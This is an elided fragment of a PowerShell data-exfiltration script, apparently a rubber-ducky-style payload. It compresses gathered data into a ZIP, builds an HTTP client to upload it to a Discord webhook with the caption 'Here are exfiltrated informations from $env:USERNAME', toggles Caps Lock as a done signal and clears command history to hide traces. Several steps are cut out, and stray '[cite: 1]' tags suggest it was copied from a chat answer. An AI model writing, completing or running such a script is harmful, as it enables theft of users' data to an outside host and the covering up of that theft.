...
# Download necessary tools[cite: 1]
...
# Execute tools to gather data[cite: 1]
...
# Wait for the files to be fully written[cite: 1]
...
# Compress extracted data[cite: 1]
Compress-Archive -Path "$dumpFolder\*" -DestinationPath "$dumpFile" -Force

# Wait until the ZIP file is created[cite: 1]
while (!(Test-Path "$dumpFile")) {
    Start-Sleep -Seconds 1
}

# Check if the file exists before sending[cite: 1]
if (!(Test-Path $dumpFile)) {
    exit 1
}

# Ensure System.Net.Http is available[cite: 1]
...
# Create HTTP client for Discord Webhook
$client = New-Object System.Net.Http.HttpClient
$content = New-Object System.Net.Http.MultipartFormDataContent

# Add optional text message with the file
$caption = "Here are exfiltrated informations from $env:USERNAME"
$content.Add((New-Object System.Net.Http.StringContent($caption)), "content")

# Attach the ZIP file to Discord
...
# Caps Lock signal[cite: 1]
$keyBoardObject = New-Object -ComObject WScript.Shell
for ($i=0; $i -lt 4; $i++) {$keyBoardObject.SendKeys("{CAPSLOCK}")
    Start-Sleep -Seconds 1
}

# Clear command history[cite: 1]
